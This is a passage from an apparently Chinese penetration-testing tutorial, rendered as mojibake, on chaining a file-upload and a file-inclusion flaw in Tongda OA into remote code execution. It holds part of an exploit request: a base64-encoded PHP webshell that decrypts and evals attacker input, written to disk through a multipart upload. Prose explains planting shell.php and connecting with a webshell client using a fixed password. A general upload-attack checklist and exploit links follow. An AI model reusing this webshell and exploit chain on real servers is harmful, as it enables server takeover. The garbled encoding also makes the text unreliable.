4iIik7CgkJCgkJZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7CiAgICAJCQkgJHBvc3RbJGldID0gJHBvc3RbJGldXiRrZXlbJGkrMSYxNV07IAogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJHApIHtldmFsKCRwLiIiKTt9fQoJQG5ldyBDKCRwYXJhbXMpOwp9Cj8+");
fwrite($fp, $a);
fclose($fp);
?>
------WebKitFormBoundarypyfBh1YB4pV8McGB--
```

![img](https://gitee.com/YatJay/image/raw/master/img/202203011919924.png)

æŸ¥çœ‹ç”Ÿæˆçš„å›¾ç‰‡ï¼š

![img](https://gitee.com/YatJay/image/raw/master/img/202203011919011.png)

å‰å°æ–‡ä»¶åŒ…å«æ¼æ´ï¼šä¿®æ”¹æ•°æ®åŒ…ï¼ŒåŒ…å«å‰é¢ä¸Šä¼ çš„jpgæœ¨é©¬æ–‡ä»¶ï¼Œä¼šåœ¨/webroot/ispirit/interface/ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª shell.php æ–‡ä»¶ã€‚

æˆåŠŸæ‰§è¡Œï¼š

![img](https://gitee.com/YatJay/image/raw/master/img/202203011919588.png)

æŸ¥çœ‹/webroot/ispirit/interface/ç›®å½•ç”Ÿæˆçš„shellæ–‡ä»¶ï¼š

![img](https://gitee.com/YatJay/image/raw/master/img/202203011919878.png)

ç”¨å†°èè¿æ¥ï¼Œ/ispirit/interface/shell.phpç”¨å†°èè¿æ¥ï¼Œhttp://localhost:999/ispirit/interface/shell.php

å¯†ç ä¸ºï¼špass

![img](https://gitee.com/YatJay/image/raw/master/img/202203011919271.png)

æ¼æ´åˆ†æ

è¯¥æ¼æ´åœ¨ç»•è¿‡èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹é€šè¿‡æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸Šä¼ æ¶æ„phpæ–‡ä»¶ï¼Œç»„åˆæ–‡ä»¶åŒ…å«æ¼æ´æœ€ç»ˆé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œä»è€Œå¯¼è‡´å¯ä»¥æ§åˆ¶æœåŠ¡å™¨systemæƒé™ã€‚

é™„ï¼š

https://www.cnblogs.com/twlr/p/12989951.html

[é€šè¾¾OAç³»ç»Ÿå‚»é€¼ä¸Šä¼ æ¼æ´åˆ†æï¼Œå¯ä»¥ç›´æ¥getshellé™„EXP](https://www.jincon.com/archives/239/)

æ³¨æ„å¼•å·é—®é¢˜

![img](https://gitee.com/YatJay/image/raw/master/img/202203011919697.png)

### æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„æ¸—é€æ€è·¯â€”â€”å³æœ¬ç« æ€ç»´å¯¼å›¾

- ä¸Šä¼ ç‚¹ï¼šå½“æˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ªç½‘ç«™å¯é€šè¿‡æ‰«ææˆ–æ‰‹åŠ¨æŸ¥æ‰¾æ˜¯å¦æœ‰æ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹ï¼Œæ¯”å¦‚ä¼šå‘˜ä¸­å¿ƒç­‰åœ°æ–¹ï¼Œè¿›è¡Œä¸Šä¼ åŠç»•è¿‡è¿‡æ»¤éªŒè¯

- ä¸­é—´ä»¶è§£ææ¼æ´ï¼šä¹Ÿå¯é€šè¿‡æ•°æ®åŒ…æˆ–æŒ‡çº¹è¯†åˆ«æ˜¯ä½•ç§ä¸­é—´ä»¶ï¼Œå¦‚æ˜¯ä½ç‰ˆæœ¬å¯ä»¥åˆ©ç”¨ä¸€äº›è§£ææ¼æ´ä¸Šä¼ æ–‡ä»¶ï¼Œè¿›è¡Œé»‘ç™½åå•ç»•è¿‡æµ‹è¯•ã€‚

- CMSï¼šå†è€…çŸ¥é“æ˜¯ä½•ç§CMSçš„è¯å¯ä»¥åˆ©ç”¨CMSçš„æ¼æ´ã€‚

- ç¼–è¾‘å™¨ï¼šä¸€äº›ç½‘ç«™ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„ç¼–è¾‘å™¨ï¼Œå¯ä»¥å¯»æ‰¾ç¼–è¾‘å™¨çš„æ¼æ´è¿›è¡Œçªç ´ã€‚

- CVEï¼šå†è€…ä¹Ÿå¯ä»¥æ‰¾ä¸€äº›CVEç¼–å·æ¼æ´è¿›è¡Œåˆ©ç”¨ã€‚

# æ¶‰åŠèµ„æº

[ç¼–è¾‘å™¨æ¼æ´æ‰‹å†Œ](https://navisec.it/)

https://www.jb51.net/softs/75619.html

[ğŸ“webä¸­é—´ä»¶å¸¸è§æ¼æ´æ€»ç»“.pdf](https://www.yuque.com/attachments/yuque/0/2021/pdf/22078880/1629509157161-d33b5310-94e2-4a1f-b820-0342eff2cb17.pdf)

é“¾æ¥ï¼šhttps://pan.baidu.com/s/1eLjH_88fhXAw3ZwE7kVRbA æå–ç ï¼šywek
